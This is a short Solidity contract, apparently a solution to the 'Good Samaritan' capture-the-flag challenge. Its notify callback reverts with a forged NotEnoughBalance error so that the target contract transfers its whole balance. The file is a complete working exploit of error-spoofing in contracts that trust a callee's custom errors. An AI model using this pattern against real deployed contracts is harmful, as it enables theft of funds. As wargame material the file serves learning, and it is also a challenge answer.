// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}
interface INotifyable {
    function notify(uint256 amount) external;
}

contract HackerGoodSamaritan is INotifyable {
    constructor() {}

    function hack(address _target) external {
        IGoodSamaritan(_target).requestDonation();
    }

    error NotEnoughBalance();

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
